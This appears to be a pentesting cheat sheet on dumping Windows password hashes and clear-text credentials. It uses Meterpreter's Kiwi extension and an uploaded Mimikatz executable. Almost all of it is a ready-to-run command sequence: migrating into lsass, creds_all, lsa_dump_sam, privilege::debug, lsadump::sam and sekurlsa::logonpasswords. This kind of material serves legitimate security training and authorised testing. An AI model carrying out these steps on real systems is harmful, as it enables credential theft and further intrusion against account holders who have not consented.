
## Dumping Hashes Mimikatz

_**\*Mimikatz will require elevated privileges in order to run correctly.**_

> *   Mimikatz is a Windows post-exploitation tool. It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from  
>     memory.
> *   The SAM (Security Account Manager) database, is a database file on Windows systems  
>     that stores hashed user passwords.
> *   Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes  
>     are cached.
> *   We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a  
>     meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension  
>     Kiwi.

After gaining access to the target system, migrate to lsass process:

```plaintext
pgrep lsass
migrate <lsass id>
```

### Using Kiwi module

```plaintext
meterpreter >
load kiwi
```

See options

```plaintext
?
```

Dumping all credentials

```plaintext
creds_all
```

Dump all NTLM hashes

```plaintext
lsa_dump_sam
```

### Using Mimikatz

Navigate to Temp directory

meterpreter >

```plaintext
mkdir Temp
cd Temp
```

Upload the Mimikatz executable to Temp directory:

```plaintext
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Open a CMD shell session

```plaintext
shell
dir
```

Execute Mimikatz

```plaintext
.\mimikatz.exe
```

Check privileges:

```plaintext
mimikatz >
privilege::debug
```

Dump the cache from lsass process

```plaintext
lsadump::sam
```

Display logon passwords. \*If the system has been configured to store logon passwords in memory in clear text.

```plaintext
sekurlsa::logonpasswords
```
